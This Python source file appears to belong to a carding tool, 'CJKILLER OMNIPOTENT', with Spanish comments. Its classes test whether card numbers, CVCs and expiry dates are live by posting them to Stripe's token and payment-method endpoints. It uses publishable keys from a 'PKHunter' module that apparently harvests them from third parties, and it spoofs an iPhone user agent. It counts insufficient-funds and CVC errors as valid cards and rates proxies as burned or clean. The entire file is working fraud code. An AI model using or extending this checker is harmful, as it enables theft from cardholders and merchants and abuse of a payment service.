# =================================================================
# PROJECT: CJKILLER OMNIPOTENT
# MODULE: checker_engine.py (DUAL GATEWAY SYSTEM)
# =================================================================

import requests
from pk_hunter import PKHunter

class RiskAnalyzer:
    @staticmethod
    def get_risk_report(response_json):
        """Analiza la salud de la conexión sin alterar el gate."""
        risk_level = response_json.get('outcome', {}).get('risk_level', 'unknown')
        if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
        if risk_level == 'elevated': return "🟡 RIESGO MEDIO (IP Sospechosa)"
        return "🟢 RIESGO BAJO (Conexión Limpia)"

class CCChecker:
    current_pk = None

    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        """ESTE ES TU GATE DE STRIPE ACTUAL (NO SE TOCA LA LÓGICA)"""
        if not CCChecker.current_pk: CCChecker.current_pk = PKHunter.get_fresh_pk()
        
        payload = {
            'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy,
            'key': CCChecker.current_pk
        }
        
        try:
            r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
            res = r.json()
            # Retornamos el status y la respuesta cruda para el RiskAnalyzer
            if "id" in res:
                return {"status": "LIVE ✅", "msg": "Token Created", "raw": res}
            return {"status": "DEAD ❌", "msg": res.get('error', {}).get('message', 'Declined'), "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Timeout", "raw": {}}

class ChaosGate:
    @staticmethod
    def check_chaos(cc, mm, yy, cvv):
        """NUEVO MOTOR CHAOS AUTH (PARA EL COMANDO /CHAOS)"""
        pk = PKHunter.get_fresh_pk()
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'}
        payload = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        
        try:
            # Chaos usa Payment Methods por ser más profundo
            r = requests.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=headers, timeout=15)
            res = r.json()
            
            if "id" in res:
                return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
            
            err_msg = res.get('error', {}).get('message', '')
            if any(x in err_msg.lower() for x in ["funds", "cvc", "authentication"]):
                return {"status": "LIVE ✅", "msg": f"Chaos: {err_msg}", "raw": res}
                
            return {"status": "DEAD ❌", "msg": err_msg, "raw": res}
        except:
            return {"status": "ERROR ⚠️", "msg": "Chaos Timeout", "raw": {}}
